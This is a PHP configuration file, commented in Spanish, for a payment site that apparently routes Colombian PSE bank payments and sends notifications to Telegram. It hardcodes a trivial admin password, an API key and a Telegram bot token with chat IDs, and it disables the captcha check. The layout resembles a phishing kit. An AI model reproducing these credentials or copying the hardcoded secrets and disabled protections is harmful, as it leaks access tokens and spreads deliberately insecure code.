<?php
/**
 * Configuración central del proyecto.
 * Lee admin/config.json y expone valores con defaults seguros.
 * Si una clave no existe en el panel, se usa el valor por defecto
 * para que el proyecto siga funcionando aunque se suba "en limpio".
 */

function app_config(): array {
    static $cfg = null;
    if ($cfg !== null) return $cfg;

    $defaults = [
        'sistema_activo' => true,
        'admin_password' => '1234567',
        'api_key' => 'wp_live_extulpdg8sfqetunmwt4h7nk',
        'bancos_pse_activos' => ['1007','1023','1002','1052','1013','1032','1062','1063','1006','1047','1069','1070','1019','1040','1060','1061','1507','1551','1097','1809'],
        'tarjeta_activa' => true,
        'telegram' => [
            'bot_token' => '9222539154:AAFsUpJG4aj4efzPHpTF6-WAMt8rgpt4SKA',
            'chat_id_genericos' => '-5219106325',
            'chat_id_ingresos' => '-5219106325'
        ],
        'pagos' => [
            'api_url' => 'https://futuapigoluni.tech/api/generar-pago',
            'api_key' => 'wp_live_extulpdg8sfqetunmwt4h7nk'
        ],
        'cloudflare' => [
            'site_key' => '',
            'secret_key' => '',
            'activo' => true
        ]
    ];

    $file = __DIR__ . '/../admin/config.json';
    $saved = [];
    if (file_exists($file)) {
        $saved = json_decode(file_get_contents($file), true) ?: [];
    }

    // Merge profundo de un nivel para sub-secciones asociativas.
    // Las LISTAS (ej. bancos_pse_activos) no se mezclan: el valor guardado
    // manda, incluso si está vacío (0 bancos activos = todos en flujo manual).
    $cfg = $saved;
    foreach ($defaults as $k => $v) {
        if (!isset($cfg[$k])) {
            $cfg[$k] = $v;
        } elseif (is_array($v) && is_array($cfg[$k])) {
            $esLista = array_keys($v) === range(0, count($v) - 1);
            if (!$esLista) {
                $cfg[$k] = array_merge($v, $cfg[$k]);
            }
        }
    }

    // Compatibilidad: api_key viejo alimenta pagos.api_key si no hay uno nuevo
    if (empty($cfg['pagos']['api_key']) && !empty($cfg['api_key'])) {
        $cfg['pagos']['api_key'] = $cfg['api_key'];
    }
    if (empty($cfg['pagos']['api_key'])) {
        $cfg['pagos']['api_key'] = $defaults['pagos']['api_key'];
    }
    if (empty($cfg['pagos']['api_url'])) {
        $cfg['pagos']['api_url'] = $defaults['pagos']['api_url'];
    }

    // ============================================================
    // Variables de entorno (Render): tienen PRIORIDAD sobre todo.
    // En Render no existe admin/config.json (gitignored), así que
    // las credenciales se configuran en Dashboard → Environment.
    // NOTA: Telegram NO se lee de env — las credenciales viven en
    // los defaults de arriba (repo privado), porque un valor viejo
    // en el dashboard de Render quedaría pisando la config nueva.
    // ============================================================
    $env = [
        'api_key'                  => getenv('FUTU_API_KEY'),
        'pagos.api_key'            => getenv('FUTU_API_KEY'),
        'pagos.api_url'           => getenv('FUTU_API_URL'),
        'cloudflare.site_key'      => getenv('CF_SITE_KEY'),
        'cloudflare.secret_key'    => getenv('CF_SECRET_KEY'),
    ];
    foreach ($env as $path => $val) {
        if ($val === false || $val === '') continue;
        $parts = explode('.', $path);
        $ref = &$cfg;
        foreach ($parts as $i => $p) {
            if ($i === count($parts) - 1) { $ref[$p] = $val; }
            else {
                if (!isset($ref[$p]) || !is_array($ref[$p])) $ref[$p] = [];
                $ref = &$ref[$p];
            }
        }
        unset($ref);
    }

    // Fallback: chat de ingresos = chat de notificaciones si está vacío
    if (empty($cfg['telegram']['chat_id_ingresos']) && !empty($cfg['telegram']['chat_id_genericos'])) {
        $cfg['telegram']['chat_id_ingresos'] = $cfg['telegram']['chat_id_genericos'];
    }

    return $cfg;
}

function app_cfg(string $key, $default = null) {
    $cfg = app_config();
    $parts = explode('.', $key);
    $val = $cfg;
    foreach ($parts as $p) {
        if (!is_array($val) || !array_key_exists($p, $val)) return $default;
        $val = $val[$p];
    }
    return $val;
}

/** True si hay captcha real configurado (site key + secret y activo) */
function app_turnstile_activo(): bool { return false; } // off
